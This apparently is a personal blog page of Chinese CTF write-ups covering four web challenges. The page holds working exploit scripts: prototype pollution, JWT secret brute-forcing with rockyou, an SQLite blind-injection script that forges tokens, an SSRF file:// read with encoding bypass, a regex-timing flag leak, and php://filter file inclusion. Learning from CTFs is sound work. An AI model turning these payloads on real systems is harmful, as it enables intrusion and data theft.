<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">140</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Tlife</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/31/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-31</time><div class="content"><h2 id="1127"><a href="#1127" class="headerlink" title="1127"></a>1127</h2><p>可以看源码，所以直接查看源码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (req.session.won &gt;= <span class="number">100</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;you won&quot;</span>)</span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign (</span><br><span class="line">            &#123;</span><br><span class="line">                id : req.session.want_to_eat,</span><br><span class="line">                is_win : <span class="string">&quot;true&quot;</span></span><br><span class="line">            &#125;, env.parsed.rockyou, &#123;</span><br><span class="line">                expiresIn: <span class="number">3600</span> * <span class="number">12</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        res.cookie(<span class="string">&quot;token&quot;</span>, token, &#123;</span><br><span class="line">            maxAge: <span class="number">3600</span> * <span class="number">12</span>,</span><br><span class="line">            httpOnly: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">        req.session.is_win = <span class="string">&quot;true&quot;</span></span><br><span class="line">        res.redirect(<span class="string">&quot;/award&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果圣诞老人赢了5次那么你就输了</span></span><br><span class="line">    <span class="keyword">if</span> ( req.session.santa &gt; <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        req.session.destroy()</span><br><span class="line">        res.render(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>赢100次就胜利，显然不太可能，于是继续看看其他地方，这里发现session可以被player的属性赋值，那么如果我们将player这里就对won属性赋值&gt;100不就可以了吗，初步推断可能存在原型链污染之类</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/start&#x27;</span>, <span class="function">(<span class="params">req, res</span>)=&gt;</span>&#123;  </span><br><span class="line"><span class="keyword">if</span> ( player.name )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> player)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (req.session.hasOwnProperty(i))</span><br><span class="line">                req.session[i] = player[i]</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.end(<span class="string">&quot;Do you think i am stupid?&quot;</span>)</span><br><span class="line">                player = &#123;&#125;</span><br><span class="line">                req.session.destroy()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>但是在另一个地方：发现有对won的重新赋值，所以应该还要再考虑一下原型链污染的一个顺序问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.post(&#39;&#x2F;start&#39;, (req, res)&#x3D;&gt;&#123;</span><br><span class="line">    if ( !req.cookies.token || !req.session.name )</span><br><span class="line">    &#123;</span><br><span class="line">        res.status(403).send(&quot;you are not allowed to visit this page&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ( !req.session.won )</span><br><span class="line">        req.session.won &#x3D; 0</span><br><span class="line"></span><br><span class="line">    if ( !req.session.santa )</span><br><span class="line">        req.session.santa &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>最后再POST /这个路由中看到，果然有可以污染的地方</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">player[i] = tempPlayer[i]</span><br></pre></td></tr></table></figure>

<p>捋一下思路：<br>先对POST /污染一下player ——&gt;到POST /start 初始化session——&gt;GET /start 对session进行赋值，将其won属性赋值给session<br>但是我又看了一下似乎这样还是不够的,/award中还有一个is_win要是true，这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (req.user.is_win !&#x3D;&#x3D; &#39;true&#39; || req.session.is_win !&#x3D;&#x3D; &#39;true&#39; )</span><br></pre></td></tr></table></figure>

<p>向上看了一下，POST /start中有对这一项进行ture的赋值，所以应该还要再回来post /start中对这个进行赋值</p>
<p>首先把post污染一下那个won属性，然后把token复制回去替换一下去访问就可以发现player已经101分了<br><img src="/.com//blog\hexo\source\_posts\刷题记录\[I@DZ6QBHV{F@Q3UN{B_DEL.png" style="zoom:67%;"><br><img src="/.com//blog\hexo\source\_posts\刷题记录\9{K~IDZGN`5{(K5)C1@5W5V.png" style="zoom:67%;"></p>
<p>然后就有token让你跳转到/award</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902174200.png" alt="img" style="zoom:67%;">

<p>然后无事发生？、?</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902174426.png" alt="img" style="zoom:67%;">
回去看看源码，这边似乎要注入，但是我不知道id在哪，感觉是要伪造jwt于是再看看==

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    let patt &#x3D; &#x2F;union|like|pragma|savepoint|vacuum|detach|alter|attach|insert|update|release|rollback|load|create|drop|delete|explain|regexp|&#x3D;|&gt;|&lt;|&quot;|&#39;&#x2F;i</span><br><span class="line">    if ( req.user.id.match(patt) )</span><br><span class="line">    &#123;</span><br><span class="line">        res.status(403).end(&quot;Never Trust Your User&quot;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    db.get(&#96;SELECT ITEM,LOG FROM AWARD WHERE id&#x3D;$&#123;req.user.id&#125;&#96;,function(err,row)&#123;</span><br><span class="line">        if (!row) &#123;</span><br><span class="line">            res.render(&quot;reward&quot;, &#123;&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;&#125;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">        if (row[&quot;ITEM&quot;] &amp;&amp; row[&quot;LOG&quot;])&#123;</span><br><span class="line">            res.render(&quot;reward&quot;, &#123;&quot;award&quot;: row[&quot;ITEM&quot;], &quot;message&quot; : row[&quot;LOG&quot;]&#125; )</span><br><span class="line">        &#125; else res.render(&quot;reward&quot;, &#123;&quot;award&quot;: &quot;&quot;, &quot;log&quot;: &quot;&quot;&#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>用工具发现出不来，于是在回去找找信息：发现是要用rockyou的字典才行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">jwt_str = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot;</span></span><br><span class="line">path = <span class="string">&quot;C:/Users/10452/Desktop/rockyou.txt&quot;</span></span><br><span class="line">alg = <span class="string">&quot;HS256&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        key_ = line.strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(jwt_str,verify=<span class="literal">True</span>,key=key_,algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">            print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">            print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>(jwt.exceptions.InvalidSignatureError):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;key not found!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>拿到key然后去换一下user看看源码这个看起来就是要盲注了吧<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902220840.png" alt="img" style="zoom:67%;"></p>
<p>应该就是要用这个id来进行盲注了吧<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210902222950.png" alt="img" style="zoom:67%;"></p>
<p>那么接下来的思路就是构造sql注入语句，然后替换到id那边重新进行加密，但是每次要到这个/award都需要重新构造id，就要伪造jwt，这里就编写一下python脚本跑一下？<br>首先看看如何构造盲注语句：<br>根据他的结果，如果查询到就返回结果，查询不到就返回空好像，然后根据这个过滤内容，看起来不像是mysql，毕竟mysql没有vacuum这个东西吧，查了一下，这个是sqlite的东西，所以这题应该是sqlite盲注<br>盲注中的截取没咋过滤，就直接用substr就可以，然后比较符过滤了，很多，看了一下in没被过滤，所以这里考虑用in试试,由于引号都被过滤了，所以可以直接使用char函数进行绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://a.y1ng.vip:1127/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">game=<span class="string">&quot;s%3AAUHzfM13c2l68I75rIKMDLtiU8GKtpxJ.H3ugRxCwtqH1Ey6%2F1IClRNwrt8Ba5uE0FSihnsXd2kE&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jwt_boom</span>():</span></span><br><span class="line">    jwt_str = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc193aW4iOiJmYWxzZSIsImlhdCI6MTYzMDU3MzUzOSwiZXhwIjoxNjMwNjE2NzM5fQ.mAH_mgq1JvEtgyJ3CpfF0xN-7ca_scyUrbuFZzPOIXs&quot;</span></span><br><span class="line">    path = <span class="string">&quot;C:/Users/10452/Desktop/rockyou.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(path,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str,verify=<span class="literal">True</span>,key=key_,algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">                print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                print(<span class="string">&#x27;found key! --&gt; &#x27;</span> +  key_)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>(jwt.exceptions.InvalidSignatureError):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;key not found!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jwt_encode</span>(<span class="params">payload_t</span>):</span></span><br><span class="line">    json = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: payload_t,</span><br><span class="line">        <span class="string">&quot;is_win&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        <span class="string">&quot;iat&quot;</span>: <span class="number">1630654737</span>,</span><br><span class="line">        <span class="string">&quot;exp&quot;</span>: <span class="number">1630697937</span></span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(json, <span class="string">&quot;fuckoff123&quot;</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord_tran</span>(<span class="params">s</span>):</span></span><br><span class="line">    fin=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        fin +=<span class="string">f&quot;<span class="subst">&#123;ord(i)&#125;</span>,&quot;</span></span><br><span class="line">    <span class="comment">#print(f&quot;chr(&#123;fin[:-1]&#125;)&quot;)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;char(<span class="subst">&#123;fin[:<span class="number">-1</span>]&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload</span>):</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">128</span>):</span><br><span class="line">            payload_f=<span class="string">f&quot;1 and char(<span class="subst">&#123;j&#125;</span>) in (substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1));--&quot;</span></span><br><span class="line">            <span class="comment">#print(payload_f)</span></span><br><span class="line">            token=jwt_encode(payload_f)</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;cookie&quot;</span>:<span class="string">f&quot;game=<span class="subst">&#123;game&#125;</span>; token=<span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(headers)</span></span><br><span class="line">            r=s.get(url=url+<span class="string">&#x27;award&#x27;</span>,headers=headers).text</span><br><span class="line"></span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Turkey&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                result += chr(j)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#jwt_boom() #key=fuckoff123</span></span><br><span class="line">    <span class="comment">#payload=&quot;SELECT group_concat(name) FROM sqlite_master&quot;#AWARD,sqlite_autoindex_AWARD_1,SECRET,sqlite_autoindex_SECRET_1</span></span><br><span class="line">    <span class="comment">#ord_tran(&quot;SECRET&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#payload=f&quot;SELECT group_concat(sql) FROM sqlite_master WHERE tbl_name in (&#123;ord_tran(&#x27;SECRET&#x27;)&#125;)&quot;#fl4ggg</span></span><br><span class="line">    payload=<span class="string">f&quot;SELECT group_concat(fl4ggg) FROM SECRET&quot;</span><span class="comment">#almost,flag&#123;f7f0f684-0abf-ffe1-c561-a186d17a0b1d&#125;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>sqlite注入：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627#toc-3">https://xz.aliyun.com/t/8627#toc-3</a></p>
<h2 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h2><p>一开始我输入任何的url都没用，一直说后缀不对，原来是要在url后面加一个png。。。。所以可以用file协议读一下源码，由于过滤了var，可以通过二次url编码进行绕过，为什么用?号呢。其实这里可以理解为一个分割的作用吧，?png不影响前面地址的访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;%25%37%36ar&#x2F;www&#x2F;html&#x2F;index.php?png</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">	$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|apache|conf|var|proc|log/i&quot;</span> ,$url))&#123;</span><br><span class="line">		$dieMess = <span class="string">&quot;Dangerous content.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		$end = substr($url, strlen($url) - <span class="number">3</span>, strlen($url));</span><br><span class="line">		<span class="keyword">if</span>($end === <span class="string">&quot;png&quot;</span>)&#123;</span><br><span class="line">			$curlobj = curl_init($url);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_TIMEOUT, <span class="number">200</span>);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_URL, $url); </span><br><span class="line">			curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">			curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">			$res = curl_exec($curlobj);</span><br><span class="line">			<span class="keyword">if</span>(ord($res) &lt; <span class="number">0x80</span>)&#123;</span><br><span class="line">				$dieMess = $res;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$httpCode = curl_getinfo($curlobj, CURLINFO_HTTP_CODE);</span><br><span class="line">			var_dump($httpCode); </span><br><span class="line">			<span class="keyword">if</span>($httpCode &lt; <span class="number">300</span>)&#123;</span><br><span class="line">				$down = curl_init($url);</span><br><span class="line">				$tmpFile = tempnam(sys_get_temp_dir(), <span class="string">&#x27;image&#x27;</span>);</span><br><span class="line">				$resource = fopen($tmpFile, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line">				curl_setopt($down, CURLOPT_FILE, $resource);</span><br><span class="line">				curl_setopt($down, CURLOPT_TIMEOUT, <span class="number">200</span>);</span><br><span class="line">				curl_setopt($down, CURLOPT_URL, $url); </span><br><span class="line">				curl_setopt($down, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">				curl_exec($down);</span><br><span class="line">				$filename = <span class="string">&quot;./you_will_never_find_me_hiahiahia_and_my_duty_is_storage_tmp_file/&quot;</span> . md5(time()) . <span class="string">&quot;.png&quot;</span>;</span><br><span class="line">				copy($tmpFile, $filename);</span><br><span class="line">				@unlink($tmpFile);</span><br><span class="line">				<span class="keyword">if</span>($dieMess == <span class="string">&quot;&quot;</span>)</span><br><span class="line">					$dieMess = <span class="string">&quot;Your picture&#x27;s colorful number is &quot;</span> . getMainColor($filename, <span class="string">&#x27;1&#x27;</span>) . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">				@unlink($filename);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				$dieMess = <span class="string">&quot;Woops, seem I can not visit it!&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$dieMess = <span class="string">&quot;Extension not allowed!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以应该是将tmpfile文件的内容赋值给filename中，然后访问即可，接下来就是找flag在哪里，可以猜一下是否在/flag或者/flag.txt~</p>
<h2 id="1115"><a href="#1115" class="headerlink" title="1115"></a>1115</h2><p>扫描一下 发现有source目录</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;safe_regexp&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAG = File.open(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&quot;r&quot;</span>).read <span class="comment"># 是一个MD5，提交时请包裹上flag&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">String.class_eval <span class="keyword">do</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">text</span></span></span><br><span class="line">    <span class="keyword">return</span> [<span class="keyword">self</span>].pack(<span class="string">&#x27;H*&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  File.open(<span class="string">&#x27;/app/app/index.html&#x27;</span> , <span class="string">&quot;r&quot;</span>).read</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/check/:regex&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    regexp = Regexp.new(params[<span class="string">&#x27;regex&#x27;</span>].text)</span><br><span class="line">    p regexp</span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&quot;False!&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    SafeRegexp.execute(regexp, <span class="symbol">:match?</span>, FLAG, <span class="symbol">timeout:</span> <span class="number">3</span>)</span><br><span class="line">    <span class="string">&quot;OK!&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&quot;False!&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/source&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  File.open(__FILE_<span class="number">_</span> , <span class="string">&quot;r&quot;</span>).read</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>这题是正则表达式延时，直接打就行了~</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;net/http&#x27;</span></span><br><span class="line"></span><br><span class="line">CHALLENGE = <span class="string">&#x27;http://a.y1ng.vip:1115&#x27;</span></span><br><span class="line"></span><br><span class="line">String.class_eval <span class="keyword">do</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">hex</span></span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">self</span>.each_byte <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">      res += <span class="string">&quot;%02x&quot;</span> % i</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random</span><span class="params">(len)</span></span></span><br><span class="line">  chars = (<span class="string">&quot;a&quot;</span>..<span class="string">&quot;z&quot;</span>).to_a + (<span class="string">&quot;A&quot;</span>..<span class="string">&quot;Z&quot;</span>).to_a + (<span class="string">&quot;0&quot;</span>..<span class="string">&quot;9&quot;</span>).to_a</span><br><span class="line">  s = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="number">1</span>.upto(len) <span class="keyword">do</span></span><br><span class="line">    s &lt;&lt; chars[rand(chars.size - <span class="number">1</span>)]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  s</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_result</span><span class="params">(reg, suffix)</span></span></span><br><span class="line">  full_regexp = <span class="string">&quot;^(?=&quot;</span> + reg + <span class="string">&quot;)((.*)*)*&quot;</span> + suffix</span><br><span class="line">  p full_regexp</span><br><span class="line">  uri = URI(CHALLENGE + <span class="string">&#x27;check/&#x27;</span> + full_regexp.hex)</span><br><span class="line">  Net::HTTP.get_response(uri)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(flag, r)</span></span></span><br><span class="line">  chars = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">  (<span class="number">0</span>..<span class="number">15</span>).each <span class="keyword">do</span> <span class="params">|i|</span></span><br><span class="line">    <span class="keyword">if</span> check_result(flag + chars[i], r).body[<span class="string">&quot;False&quot;</span>]</span><br><span class="line">      p flag + chars[i]</span><br><span class="line">      <span class="keyword">return</span> leak(flag + chars[i], r)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">r = random(<span class="number">10</span>)+<span class="string">&#x27;$&#x27;</span></span><br><span class="line">leak(<span class="string">&#x27;&#x27;</span>, r)</span><br></pre></td></tr></table></figure>



<h2 id="2014"><a href="#2014" class="headerlink" title="2014"></a>2014</h2><p>上面存在文件包含:<br>使用一下指令读取源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ASCII.UCS-2BE&#x2F;resource&#x3D;login.php</span><br><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ASCII.UCS-2BE&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<p>得到以下内容:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;d3bug&#x27;</span>])) </span><br><span class="line">&#123; phpinfo(); &#125; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) </span><br><span class="line">&#123; $page = $_GET[<span class="string">&#x27;page&#x27;</span>]; </span><br><span class="line">$filter = <span class="string">&quot;/\.\.|base|file|gopher|http|ftp|phar|base|string|data|zip|compress|base|decode|read|pear|rot|crypt|pear|utf|flag/i&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (preg_match( $filter , $page) ) </span><br><span class="line">&#123; <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>); &#125; <span class="keyword">include</span> $page; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./?page=login.php&#x27;&lt;/script&gt;&quot;</span>; &#125; </span><br></pre></td></tr></table></figure>

<p>然后看到phpinfo()里面，可以使用session文件包含，因为PHP_SESSION_UPLOAD_PROGRESS是有开的</p>
